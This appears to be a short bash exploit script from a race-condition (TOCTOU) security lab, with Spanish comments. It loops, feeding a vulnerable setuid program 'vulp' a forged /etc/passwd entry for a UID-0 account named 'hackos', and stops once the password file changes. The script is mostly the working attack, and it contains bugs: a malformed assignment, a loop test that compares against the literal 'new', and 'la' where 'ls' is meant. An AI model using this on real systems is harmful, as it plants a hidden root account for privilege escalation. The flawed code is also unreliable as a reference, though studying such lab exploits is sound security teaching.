#!/bin/bash

CHECKFILE = "ls -l /etc/passwd"

old=$($CHECKFILE)
new=$($CHECKFILE)

while ["$old"=="new"]
do
	echo "hackos:U6aMy0wmojraho:0:0:hackos" | sudo ./vulp
	new=$($CHECKFILE)
	sudo la -la /tmp/XYZ #Imprime la ruta para validar los cambios de ruta hacia /tmp/XYZ
done
echo "Detiene el proceso el fichero passwd ha sido modificado...!!!!"
